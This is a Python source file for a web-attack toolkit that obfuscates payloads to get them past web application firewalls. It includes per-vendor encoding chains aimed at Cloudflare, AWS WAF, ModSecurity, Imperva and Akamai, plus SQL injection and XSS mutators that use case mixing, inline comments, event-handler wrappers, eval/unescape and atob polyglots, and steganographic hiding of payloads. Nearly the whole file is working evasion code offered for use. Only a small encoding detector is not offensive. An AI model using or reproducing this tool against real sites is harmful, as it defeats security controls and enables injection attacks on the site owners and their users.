#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import urllib.parse
import random
import string
import re
from typing import List, Dict, Optional, Union, Tuple
import binascii
import hashlib
import logging

logger = logging.getLogger(__name__)


class MultiLayerEncoder:
   
    def __init__(self):

        self.encoding_layers = {
            'url': self.url_encode,
            'double_url': self.double_url_encode,
            'base64': self.base64_encode,
            'hex': self.hex_encode,
            'unicode': self.unicode_encode,
            'html': self.html_encode,
            'javascript': self.js_encode,
            'utf16': self.utf16_encode,
            'rot13': self.rot13_encode,
            'binary': self.binary_encode,
            'mime': self.mime_encode,
        }
        
        self.waf_profiles = {
            'cloudflare': [
                ['url', 'base64', 'unicode'],
                ['double_url', 'hex'],
                ['url', 'utf16', 'html']
            ],
            'aws_waf': [
                ['base64', 'url'],
                ['hex', 'unicode'],
                ['mime', 'base64']
            ],
            'modsecurity': [
                ['unicode', 'double_url'],
                ['utf16', 'html'],
                ['binary', 'hex']
            ],
            'imperva': [
                ['javascript', 'url'],
                ['html', 'base64'],
                ['rot13', 'unicode']
            ],
            'akamai': [
                ['mime', 'base64', 'url'],
                ['hex', 'utf16'],
                ['binary', 'unicode']
            ],
            'generic': [
                ['url', 'base64'],
                ['double_url'],
                ['html', 'javascript']
            ]
        }
    
    def url_encode(self, text: str, safe: str = '') -> str:

        return urllib.parse.quote(text, safe=safe)
    
    def double_url_encode(self, text: str) -> str:

        return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')
    
    def base64_encode(self, text: str, variant: str = 'standard') -> str:

        if variant == 'urlsafe':
            return base64.urlsafe_b64encode(text.encode()).decode()
        elif variant == 'hex':
            # Base64 من Hex
            hex_text = binascii.hexlify(text.encode()).decode()
            return base64.b64encode(hex_text.encode()).decode()
        else:
            return base64.b64encode(text.encode()).decode()
    
    def hex_encode(self, text: str, prefix: str = '') -> str:

        if prefix == '0x':
            return '0x' + binascii.hexlify(text.encode()).decode()
        elif prefix == '\\x':
            return ''.join(f'\\x{ord(c):02x}' for c in text)
        else:
            return binascii.hexlify(text.encode()).decode()
    
    def unicode_encode(self, text: str, format: str = 'percent') -> str:

        if format == 'percent':
            # %uXXXX format
            return ''.join(f'%u{ord(c):04x}' for c in text)
        elif format == 'hex':
            # \uXXXX format
            return ''.join(f'\\u{ord(c):04x}' for c in text)
        elif format == 'decimal':
            # &#XXXX; format
            return ''.join(f'&#{ord(c)};' for c in text)
        elif format == 'named':

            html_entities = {
                '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;',
                '&': '&amp;', ' ': '&nbsp;'
            }
            return ''.join(html_entities.get(c, f'&#{ord(c)};') for c in text)
        else:
            return text
    
    def html_encode(self, text: str, level: int = 1) -> str:

        if level == 1:

            return ''.join(f'&#{ord(c)};' for c in text)
        elif level == 2:

            encoded_once = ''.join(f'&#{ord(c)};' for c in text)
            return ''.join(f'&#{ord(c)};' for c in encoded_once)
        else:

            result = []
            for c in text:
                if random.random() > 0.5:
                    result.append(f'&#{ord(c)};')
                else:
                    result.append(c)
            return ''.join(result)
    
    def js_encode(self, text: str) -> str:

        encoded = ''.join(f'\\u{ord(c):04x}' for c in text)
        
        wrappers = [
            lambda x: f"eval(unescape('{x}'))",
            lambda x: f"String.fromCharCode({','.join(str(ord(c)) for c in x)})",
            lambda x: f"\\x{binascii.hexlify(x.encode()).decode()}",
        ]
        
        if random.random() > 0.7:
            wrapper = random.choice(wrappers)
            return wrapper(text)
        
        return encoded
    
    def utf16_encode(self, text: str) -> str:

        return text.encode('utf-16be').hex()
    
    def rot13_encode(self, text: str) -> str:

        result = []
        for c in text:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)
    
    def binary_encode(self, text: str) -> str:

        return ' '.join(format(ord(c), '08b') for c in text)
    
    def mime_encode(self, text: str) -> str:

        encoded = base64.b64encode(text.encode()).decode()
        return f"=?UTF-8?B?{encoded}?="
    
    def apply_layers(self, text: str, layers: List[str], randomize: bool = False) -> List[str]:

        results = []
        
        if randomize:

            for _ in range(5):  # 5 توليفات مختلفة
                selected_layers = random.sample(
                    list(self.encoding_layers.keys()), 
                    random.randint(2, 4)
                )
                result = text
                for layer in selected_layers:
                    result = self.encoding_layers[layer](result)
                results.append(result)
        else:

            result = text
            for layer in layers:
                if layer in self.encoding_layers:
                    result = self.encoding_layers[layer](result)
            results.append(result)
        
        return results
    
    def encode_for_waf(self, payload: str, waf_type: str = 'generic') -> List[str]:

        encoded_payloads = []
        
        if waf_type not in self.waf_profiles:
            waf_type = 'generic'
        
        profiles = self.waf_profiles[waf_type]
        
        for profile in profiles:
            try:
                result = payload
                for layer in profile:
                    if layer in self.encoding_layers:
                        result = self.encoding_layers[layer](result)
                
                if random.random() > 0.5:
                    result = self.add_random_noise(result)
                
                encoded_payloads.append(result)
                
            except Exception as e:
                logger.debug(f"خطأ في ترميز البايلود: {e}")
        
        if payload not in encoded_payloads:
            encoded_payloads.append(payload)
        
        return list(set(encoded_payloads))  
    
    def add_random_noise(self, text: str) -> str:

        noise_chars = [' ', '\t', '\n', '\r', '/*', '*/', '--', '#', '//']
        
        if len(text) < 50:
            return text
        
        positions = random.sample(range(len(text)), min(5, len(text)//10))
        
        result = list(text)
        for pos in sorted(positions, reverse=True):
            noise = random.choice(noise_chars)
            result.insert(pos, noise)
        
        return ''.join(result)
    
    def create_obfuscated_payload(self, payload: str, technique: str = 'mixed') -> str:

        techniques = {
            'mixed': self._mix_encoding,
            'nested': self._nested_encoding,
            'split': self._split_payload,
            'reverse': self._reverse_encoding,
            'math': self._math_obfuscation,
        }
        
        if technique in techniques:
            return techniques[technique](payload)
        else:
            return self._mix_encoding(payload)
    
    def _mix_encoding(self, payload: str) -> str:

        parts = self._split_into_parts(payload, 3)
        encoded_parts = []
        
        encodings = list(self.encoding_layers.keys())
        
        for i, part in enumerate(parts):
            encoding = encodings[i % len(encodings)]
            encoded_parts.append(self.encoding_layers[encoding](part))
        
        return ''.join(encoded_parts)
    
    def _nested_encoding(self, payload: str, depth: int = 3) -> str:

        result = payload
        for i in range(depth):
            encoding = random.choice(list(self.encoding_layers.keys()))
            result = self.encoding_layers[encoding](result)
        
        return result
    
    def _split_payload(self, payload: str) -> str:

        parts = [payload[i:i+2] for i in range(0, len(payload), 2)]
        
        encoded_parts = []
        for part in parts:
            if random.random() > 0.5:
                encoded_parts.append(self.hex_encode(part, '\\x'))
            else:
                encoded_parts.append(self.unicode_encode(part, 'hex'))
        
        if random.random() > 0.7:
            joiner = random.choice(['', '+', '.', 'concat('])
            return f"{joiner}{joiner.join(encoded_parts)})"
        else:
            return ''.join(encoded_parts)
    
    def _reverse_encoding(self, payload: str) -> str:

        reversed_text = payload[::-1]
        
        encoding = random.choice(['base64', 'hex', 'url'])
        encoded = self.encoding_layers[encoding](reversed_text)
        
        if encoding == 'base64':
            return f"atob('{encoded}').split('').reverse().join('')"
        elif encoding == 'hex':
            return f"String.fromCharCode(...'{encoded}'.match(/.{{2}}/g).map(h=>parseInt(h,16))).split('').reverse().join('')"
        else:
            return encoded
    
    def _math_obfuscation(self, payload: str) -> str:

        result_parts = []
        
        for i, char in enumerate(payload):
            char_code = ord(char)
            
            operations = [
                f"{char_code}",  
                f"{char_code + 100 - 100}",  
                f"{char_code * 2 // 2}",  
                f"{char_code ^ 0 ^ 0}",  
                f"({char_code} << 1) >> 1",  
            ]
            
            operation = random.choice(operations)
            result_parts.append(f"String.fromCharCode({operation})")
        
        joiner = random.choice(['+', '.', ''])
        return joiner.join(result_parts)
    
    def _split_into_parts(self, text: str, max_parts: int = 3) -> List[str]:

        if len(text) <= max_parts:
            return [text]
        
        part_size = len(text) // max_parts
        parts = [text[i:i+part_size] for i in range(0, len(text), part_size)]
        
        if len(parts) > max_parts:
            parts = parts[:max_parts]

            parts[-1] += text[part_size * max_parts:]
        
        return parts


class SQLiEncoder:
    
    def __init__(self):
        self.comment_styles = [
            '--', 
            '-- ', 
            '--+',
            '#',
            '/*',
            '*/',
            '/*!',
        ]
        
        self.keyword_variations = {
            'SELECT': ['SELECT', 'SelEcT', 'sElEcT', '/*!SELECT*/'],
            'UNION': ['UNION', 'UnIoN', 'union', '/*!UNION*/'],
            'FROM': ['FROM', 'FrOm', 'from', '/*!FROM*/'],
            'WHERE': ['WHERE', 'WhErE', 'where', '/*!WHERE*/'],
            'OR': ['OR', 'Or', 'or', '||'],
            'AND': ['AND', 'And', 'and', '&&'],
        }
    
    def obfuscate_sql(self, sql_payload: str) -> List[str]:

        variations = []
        
        variations.append(sql_payload)
        
        variations.append(self._random_case(sql_payload))
        
        variations.append(self._add_random_spaces(sql_payload))
        
        variations.append(self._add_comments(sql_payload))
        
        variations.append(urllib.parse.quote(sql_payload))
        
        variations.append(urllib.parse.quote(urllib.parse.quote(sql_payload)))
        
        variations.append(self._unicode_encode_sql(sql_payload))
        
        variations.append(self._split_keywords(sql_payload))
        
        return list(set(variations))
    
    def _random_case(self, text: str) -> str:

        result = []
        for char in text:
            if char.isalpha():
                if random.random() > 0.5:
                    result.append(char.upper() if char.islower() else char.lower())
                else:
                    result.append(char)
            else:
                result.append(char)
        return ''.join(result)
    
    def _add_random_spaces(self, text: str) -> str:

        result = []
        for char in text:
            result.append(char)

            if random.random() < 0.2 and char not in [' ', '\n', '\t']:
                result.append(' ')
        
        if random.random() > 0.5:
            result.insert(0, ' ')
        if random.random() > 0.5:
            result.append(' ')
        
        return ''.join(result)
    
    def _add_comments(self, text: str) -> str:

        words = text.split()
        result = []
        
        for word in words:
            result.append(word)

            if random.random() < 0.3:
                comment = random.choice(self.comment_styles)
                if comment in ['/*', '/*!']:
                    result.append(f"{comment}random{random.randint(100,999)}*/")
                else:
                    result.append(f" {comment}random")
        
        return ''.join(result)
    
    def _unicode_encode_sql(self, text: str) -> str:

        replacements = {
            "'": "%u0027",
            '"': "%u0022",
            "-": "%u002d",
            "#": "%u0023",
            " ": "%u0020",
            "=": "%u003d",
        }
        
        result = text
        for old, new in replacements.items():
            if random.random() > 0.3:  # 70% احتمال استبدال
                result = result.replace(old, new)
        
        return result
    
    def _split_keywords(self, text: str) -> str:

        for keyword, variations in self.keyword_variations.items():
            if keyword.upper() in text.upper():
                variation = random.choice(variations)

                pattern = re.compile(re.escape(keyword), re.IGNORECASE)
                text = pattern.sub(variation, text)
        
        return text


class XSSEncoder:
    
    def __init__(self):
        self.event_handlers = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeypress'
        ]
        
        self.tag_variations = {
            'script': ['script', 'SCRIPT', 'ScRiPt', '<script>'],
            'img': ['img', 'IMG', 'ImG', '<img'],
            'svg': ['svg', 'SVG', 'SvG', '<svg'],
            'iframe': ['iframe', 'IFRAME', 'IfRaMe', '<iframe'],
            'body': ['body', 'BODY', 'BoDy', '<body'],
        }
    
    def obfuscate_xss(self, xss_payload: str) -> List[str]:

        variations = []
        
        variations.append(xss_payload)
        
        # 2. HTML encoding
        variations.append(self._html_encode_xss(xss_payload))
        
        # 3. JavaScript encoding
        variations.append(self._js_encode_xss(xss_payload))
        
        # 4. URL encoding
        variations.append(urllib.parse.quote(xss_payload))
        
        # 5. Mixed encoding
        variations.append(self._mixed_encode_xss(xss_payload))
        
        # 6. Event handler variation
        variations.append(self._event_handler_xss(xss_payload))
        
        # 7. Tag variation
        variations.append(self._tag_variation_xss(xss_payload))
        
        # 8. Hex encoding
        variations.append(self._hex_encode_xss(xss_payload))
        
        return list(set(variations))
    
    def _html_encode_xss(self, text: str) -> str:

        replacements = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '&': '&amp;',
            '(': '&#40;',
            ')': '&#41;',
            '/': '&#47;',
        }
        
        result = text
        for old, new in replacements.items():
            result = result.replace(old, new)
        
        return result
    
    def _js_encode_xss(self, text: str) -> str:

        encoded = ''.join(f'\\u{ord(c):04x}' for c in text)
        
        wrappers = [
            f"eval(unescape('{encoded}'))",
            f"String.fromCharCode({','.join(str(ord(c)) for c in text)})",
            f"\\x{binascii.hexlify(text.encode()).decode()}",
        ]
        
        return random.choice(wrappers)
    
    def _mixed_encode_xss(self, text: str) -> str:

        parts = [text[i:i+len(text)//3] for i in range(0, len(text), len(text)//3)]
        
        encoded_parts = []
        for i, part in enumerate(parts):
            if i % 3 == 0:
                encoded_parts.append(urllib.parse.quote(part))
            elif i % 3 == 1:
                encoded_parts.append(base64.b64encode(part.encode()).decode())
            else:
                encoded_parts.append(''.join(f'&#{ord(c)};' for c in part))
        
        return ''.join(encoded_parts)
    
    def _event_handler_xss(self, text: str) -> str:

        event = random.choice(self.event_handlers)
        tag = random.choice(['img', 'svg', 'body', 'iframe'])
        
        if event in ['onload', 'onerror']:
            return f'<{tag} {event}="{text}">'
        else:
            return f'<{tag} {event}="alert(1)" src="x" {event}="{text}">'
    
    def _tag_variation_xss(self, text: str) -> str:

        if '<script>' in text.lower():
            tag = random.choice(['img', 'svg', 'iframe', 'body'])
            return text.replace('<script>', f'<{tag} ').replace('</script>', f'>{text}</{tag}>')
        
        return text
    
    def _hex_encode_xss(self, text: str) -> str:

        hex_text = binascii.hexlify(text.encode()).decode()
        return f'\\x{hex_text}'


class PayloadObfuscator:
    
    @staticmethod
    def hide_in_plaintext(payload: str, cover_text: str = None) -> str:

        if not cover_text:
            cover_text = "Lorem ipsum dolor sit amet, consectetur adipiscing elit."
        
        words = cover_text.split()
        
        insert_pos = random.randint(1, len(words) - 2)
        
        encoder = MultiLayerEncoder()
        encoded_payload = encoder.base64_encode(payload)
        
        words.insert(insert_pos, encoded_payload)
        
        return ' '.join(words)
    
    @staticmethod
    def create_polyglot_payload(payload: str) -> str:

        polyglot = f"""
        javascript:eval/*payload*/(atob/*encoded*/(`
        {base64.b64encode(payload.encode()).decode()}
        `))
        """
        
        polyglot = f"<!--\n{polyglot}\n--!>"
        
        return polyglot
    
    @staticmethod
    def steganography_encode(payload: str, carrier: str = "normal_text") -> str:

        if carrier == "normal_text":

            words = [
                "Hello", "World", "This", "Is", "A", "Test",
                "Please", "Ignore", "This", "Message"
            ]
            
            binary_payload = ''.join(format(ord(c), '08b') for c in payload)
            
            result = []
            for i, bit in enumerate(binary_payload):
                if i < len(words):
                    if bit == '1':
                        result.append(words[i].upper())
                    else:
                        result.append(words[i].lower())
                else:
                    break
            
            return ' '.join(result)
        
        return payload


class EncodingDetector:
    
    @staticmethod
    def detect_encoding(text: str) -> List[str]:
    
        detected = []
        
        try:
            if re.match(r'^[A-Za-z0-9+/]+={0,2}$', text):

                decoded = base64.b64decode(text + '=' * (-len(text) % 4))
                if decoded:
                    detected.append('base64')
        except:
            pass
        
        if '%' in text and len(text) % 3 == 0:
            detected.append('url')
        
        if re.match(r'^[0-9a-fA-F]+$', text):
            detected.append('hex')
        
        if re.search(r'%u[0-9a-fA-F]{4}', text):
            detected.append('unicode')
        
        if re.search(r'&#?[a-z0-9]+;', text, re.IGNORECASE):
            detected.append('html')
        
        if '\\u' in text or '\\x' in text:
            detected.append('javascript')
        
        return detected if detected else ['plain']

def quick_encode(text: str, method: str = 'url') -> str:

    encoder = MultiLayerEncoder()
    
    if method in encoder.encoding_layers:
        return encoder.encoding_layers[method](text)
    
    return text


def quick_obfuscate(payload: str, attack_type: str = 'sqli') -> List[str]:

    if attack_type == 'sqli':
        encoder = SQLiEncoder()
        return encoder.obfuscate_sql(payload)
    elif attack_type == 'xss':
        encoder = XSSEncoder()
        return encoder.obfuscate_xss(payload)
    else:

        encoder = MultiLayerEncoder()
        return [encoder.url_encode(payload), encoder.base64_encode(payload)]
